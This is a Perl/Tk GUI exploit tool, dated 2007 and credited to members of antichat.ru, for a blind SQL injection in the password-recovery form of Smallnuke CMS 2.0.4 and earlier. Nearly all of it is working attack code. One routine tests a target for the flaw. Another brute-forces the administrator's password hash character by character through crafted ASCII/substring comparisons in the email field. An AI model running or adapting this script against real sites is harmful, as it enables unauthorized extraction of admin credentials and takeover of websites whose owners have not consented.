#!/usr/bin/perl

	use Tk;
	use Tk::BrowseEntry;
	use Tk::DialogBox;
	use LWP::UserAgent;

	$mw = new MainWindow(title => "UnderWHAT?!" );

	$mw->geometry ( '420x365' ) ;
	$mw->resizable(0,0);

	$mw->Label(-text => '', -font => '{Verdana} 8',-foreground=>'red')->pack();
	$mw->Label(-text => 'Smallnuke cms <= 2.0.4 Pass Recovery Sql Injection', -font => '{Tahoma} 7 bold',-foreground=>'red')->pack();
	$mw->Label(-text => 'it will take about half an hour to get hashed password', -font => '{Tahoma} 7 bold',-foreground=>'red')->pack();
	$mw->Label(-text => 'you need magic_quotes_gpc turned off and mysql version higher that 4.1', -font => '{Tahoma} 7 bold',-foreground=>'red')->pack();
	$mw->Label(-text => '', -font => '{Tahoma} 7 bold',-foreground=>'red')->pack();


	$fleft  = $mw->Frame()->pack ( -side => 'left', -anchor => 'ne') ;
	$fright = $mw->Frame()->pack ( -side => 'left', -anchor => 'nw') ;

	$url      = 'http://test2.ru/smallnuke/';
	$user_id  = '1';
	$prefix   = 'sn_';
	$table    = 'users';
	$email    = 'ge@ma.ru';
	$column   = 'user_password';
	$report   = '';
	$group    = 1;
	$curr_user = 0;
	


	$fleft->Label ( -text => 'Path to forum index: ', -font => '{Verdana} 8 bold') ->pack ( -side => "top" , -anchor => 'e' ) ;
	$fright->Entry ( -relief => "groove", -width => 35, -font => '{Verdana} 8', -textvariable => \$url) ->pack ( -side => "top" , -anchor => 'w' ) ;

	$fleft->Label ( -text => 'User ID: ', -font => '{Verdana} 8 bold' ) ->pack ( -side => "top" , -anchor => 'e' ) ;
	$fright->Entry ( -relief => "groove", -width => 35, -font => '{Verdana} 8', -textvariable => \$user_id) ->pack ( -side => "top" , -anchor => 'w' ) ;

	$fleft->Label ( -text => 'Your email: ', -font => '{Verdana} 8 bold' ) ->pack ( -side => "top" , -anchor => 'e' ) ;
	$fright->Entry ( -relief => "groove", -width => 35, -font => '{Verdana} 8', -textvariable => \$email) ->pack ( -side => "top" , -anchor => 'w' ) ;

	$fleft->Label ( -text => 'Database tables prefix: ', -font => '{Verdana} 8 bold') ->pack ( -side => "top" , -anchor => 'e' ) ;
	$fright->Entry ( -relief => "groove", -width => 35, -font => '{Verdana} 8', -textvariable => \$prefix) ->pack ( -side => "top" , -anchor => 'w' ) ;

	$fleft->Label ( -text => 'Returned data: ', -font => '{Verdana} 8 bold') ->pack ( -side => "top" , -anchor => 'e' ) ;
	$fright->Entry ( -relief => "groove", -width => 35, -font => '{Verdana} 8', -textvariable => \$report) ->pack ( -side => "top" , -anchor => 'w' ) ;

	$fright->Label( -text => ' ')->pack();

	$fright->Button(-text    => 'Test site vulnerability',
	                -relief => "groove",
	                -width => '30',
	                -font => '{Verdana} 8 bold',
	                -activeforeground => 'red',
	                -command => \&test_vuln
	               )->pack();

	$fright->Button(-text    => 'Get hash from database',
	                -relief => "groove",
	                -width => '30',
	                -font => '{Verdana} 8 bold',
	                -activeforeground => 'red',
	                -command => \&get_hash
	               )->pack();
				   
	$mw   ->Label(-text => '', -font => '{Verdana} 7 bold',-foreground=>'red')->pack();
	$fleft->Label(-text => '!', -font => '{Webdings} 22')->pack();
	$fleft->Label(-text => 'Smallnuke cms  2.0.4', -font => '{Verdana} 7 bold',-foreground=>'red')->pack();
	$fleft->Label(-text => 'pass recovery sql injection ', -font => '{Verdana} 7 bold',-foreground=>'red')->pack();
	$fleft->Label(-text => 'mysql char bruteforcing ', -font => '{Verdana} 7 bold',-foreground=>'red')->pack();
	$fleft->Label(-text => 'bug in insert function ', -font => '{Verdana} 7 bold',-foreground=>'red')->pack();
	$fleft->Label(-text => 'by gemaglabin and Elekt  ', -font => '{Verdana} 7 bold',-foreground=>'red')->pack();
	$fleft->Label(-text => 'thx KSURi for perl help ', -font => '{Verdana} 7 bold',-foreground=>'red')->pack();
	$fleft->Label(-text => '( mafia of antichat.ru ) ', -font => '{Verdana} 7 bold',-foreground=>'red')->pack();
	$fleft->Label(-text => ' 2007.02.04 ', -font => '{Verdana} 7 bold',-foreground=>'red')->pack();
	$fright->Label(-text => '', -font => '{Verdana} 3 bold',-foreground=>'red')->pack();
	$print=$fright->Text(-width=>35,-height=>7,-wrap=>"word")->pack(-side=>"top",-anchor=>"s");
	
	MainLoop();
	
	sub get_hash()
	{
		$xpl = LWP::UserAgent->new( ) or die;
		$InfoWindow=$mw->DialogBox(-title   => 'get hash from database', -buttons => ["OK"]);
		$i = 1;
		$b = 0;
		$report = '';
		my ($sec,$min,$hour,$mday,$mon,$year,$wday,$yday,$isdst) = localtime(time);
		$print->insert('end',"- Start [$hour:$min:$sec]\n");
		my @brutearray=qw(48 49 50 51 52 53 54 55 56 57 58 97 98 99 100 101 102);
		while (length($report)<32)
		{
			$num = $brutearray[$b];
			$ret = get_pchar($i);
			if($ret > 0)
			{
				$print->insert('end',"- char [$i] = ".chr($num)."\n");
				$report .= chr($num);
				$b = 0;
				$i = $i +1;
				$mw->update(); 
				break;
			}
			else
			{
				$b = $b +1;
			}
		}
		my ($sec,$min,$hour,$mday,$mon,$year,$wday,$yday,$isdst) = localtime(time);
		$print->insert('end',"- Finish [$hour:$min:$sec]");
	}
	
	sub get_pchar($i)
	{
		$res = $xpl->post($url."index.php?go=Members",['in'=>'lost_pass','enter'=>'1','user_email'=>"$email' or ascii(substring((select password from ".$prefix."admins where admin_id=$user_id),$i,1))=$num/*"]);
		if($res->as_string =~ /info=1/i ) { return 1;} else {return 0;}
	}
	 
	sub test_vuln()
	{
		$xpl = LWP::UserAgent->new( ) or die;
		$res = $xpl->post($url."index.php?go=Members",['in'=>'lost_pass','enter'=>'1','username'=>"gema' and ascii(1)=49/*"]);
		if($res->{_rc}==302) 
		{
			$rep = '';
			if($res->as_string =~ /info=1/i ) { $print->insert('end',"- FORUM VULNERABLE\n");	}
			else { $print->insert('end',"- FORUM UNVULNERABLE\n");} 
		}
	}